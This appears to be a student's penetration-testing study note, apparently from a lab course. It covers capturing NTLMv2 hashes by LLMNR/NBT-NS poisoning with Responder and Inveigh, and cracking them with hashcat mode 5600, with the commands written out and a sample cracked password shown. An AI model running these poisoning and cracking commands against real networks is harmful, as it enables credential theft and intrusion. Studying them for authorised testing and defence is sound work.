See [[5. NTLM Attacks]]
# From Linux
Responder
- `responder -h` to see options
	- `-A`: analyze mode, see requests without poisonoing anything
	- `-wf`: start the WPAD rogue proxy server
	- `-f`: attempt to fingerprint remote host OS and version
	- `-v`: increased verbosity (for troubleshooting)
	- `-F`, `-P`: force NTLM/basic authentication and force proxy authenticaation, but may cause login prompt so use sparingly
	- `-w:` use the built in WPAD proxy server
- Hashes captured
	- Written to a log file per host located in `/usr/share/responder/logs`
	- Saved in `/usr/share/responder/logs`
- Running responder
	- `sudo responder -I eth0` (or corresponding interface)
		- Enables **default poisoning modules**
		- Listens for LLMNR,  NBT-NS, mDNS, WPAD, replies "I am that host"'
			- When victim authenticates, captures NTLM hashes


# From Windows
KIV: how to get each of these on the Windows machine and compile
## Inveigh (powershell version)
- `Import-Module .\Inveigh.ps1
- To see all parameters and usage instructions,
	- `(Get-Command Invoke-Inveigh).Parameters
	- https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters
- `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`
	- NBNS Y: enable spoofing of NetBIOS name lookups

## Inveigh.exe (C# version)
- `.\Inveigh.exe`
	- ESC to enter console
	- Type 'HELP' to see options
- `GET NTLMV2UNIQUE
	- Get one captured NTLMv2 hash per user; add search string to filter results


# Cracking Hashes
- See [[1. JtR, Hashcat]]
	- 5600 mode for NTLMv2 hashes
	- Ohter types: https://hashcat.net/wiki/doku.php?id=example_hashes
	- `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt `
	- Remember the format of hashcat
		- FOREND::INLANEFREIGHT:4af......:Klmcargo2
			- This means that the password is Klmcargo2
		- Ignore what's under "candidates"
